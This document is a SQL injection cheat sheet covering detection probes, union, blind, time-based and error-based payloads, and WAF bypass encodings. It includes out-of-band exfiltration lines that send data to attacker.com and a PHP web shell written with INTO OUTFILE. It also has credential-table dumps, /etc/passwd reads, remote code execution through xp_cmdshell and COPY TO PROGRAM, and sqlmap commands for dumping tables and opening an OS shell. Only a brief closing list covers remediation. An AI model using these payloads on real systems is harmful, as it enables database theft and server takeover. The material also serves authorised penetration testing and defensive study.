# SQL Injection

SQL Injection is a code injection technique that exploits vulnerabilities in applications that construct SQL queries from user-supplied input without proper sanitization or parameterization.

## Detection Methods

- Inject single quotes `'`, double quotes `"`, and observe error responses
- Use arithmetic: `1 AND 1=1` vs `1 AND 1=2` — different responses indicate SQLi
- Time-based probes: `'; WAITFOR DELAY '0:0:5'--` or `' AND SLEEP(5)--`
- Check for verbose SQL errors in response bodies and headers
- Test all input vectors: GET/POST params, cookies, headers (X-Forwarded-For, Referer, User-Agent)

## Union-Based Injection

Determine column count first:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY N--           -- increment until error
' UNION SELECT NULL,NULL,NULL--  -- match column count
```

Extract data once column count is known:

```sql
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

## Blind Boolean-Based

```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 1)>77--
```

Automate with binary search over ASCII ranges for each character position.

## Time-Based Blind

```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT SUBSTRING(user(),1,1))='r',SLEEP(5),0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

## Error-Based

```sql
-- MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--

-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version))--
```

## Out-of-Band (OOB)

```sql
-- MySQL (requires FILE privilege)
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\share'));

-- MSSQL (xp_dirtree)
'; EXEC master..xp_dirtree '\\attacker.com\share'--

-- Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual;
```

## Database-Specific Payloads

### MySQL

```sql
SELECT @@version;
SELECT user();
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database();
SELECT LOAD_FILE('/etc/passwd');
SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php';
```

### PostgreSQL

```sql
SELECT version();
SELECT current_user;
SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public';
COPY (SELECT '') TO PROGRAM 'id';  -- RCE if superuser
```

### MSSQL

```sql
SELECT @@version;
SELECT name FROM master..sysdatabases;
EXEC xp_cmdshell 'whoami';  -- RCE if enabled
SELECT * FROM OPENROWSET('SQLOLEDB','server';'sa';'pass','SELECT 1');
```

### SQLite

```sql
SELECT sqlite_version();
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master;  -- get CREATE TABLE statements
```

## WAF Bypass Techniques

```sql
-- Case variation
SeLeCt * FrOm users

-- Comment insertion
SEL/**/ECT * FR/**/OM users

-- URL encoding
%53%45%4C%45%43%54  -- SELECT
%27%20%4F%52%20%31%3D%31%2D%2D  -- ' OR 1=1--

-- Whitespace alternatives
SELECT%09username%0AFROM%0Dusers
SELECT/**/username/**/FROM/**/users

-- Double URL encoding
%2527 -- becomes %27 after first decode

-- No-space payloads
'OR'1'='1
'||'1'='1
```

## sqlmap Usage Tips

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1" --batch

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Specific injection point
sqlmap -u "http://target.com/page?id=1*&other=safe" --batch

# With authentication cookies
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --batch

# Custom headers and proxy
sqlmap -u "http://target.com/page?id=1" --headers="X-Custom: value" --proxy="http://127.0.0.1:8080"

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# OS shell (if possible)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Tamper scripts for WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase

# Second-order injection
sqlmap -u "http://target.com/register" --data="user=test" --second-url="http://target.com/profile"
```

## Remediation Checks

- Verify parameterized queries / prepared statements are used
- Confirm ORM usage does not include raw query interpolation
- Check stored procedures for dynamic SQL construction
- Validate input whitelisting (not blacklisting) is applied
- Confirm least-privilege database user for application connections
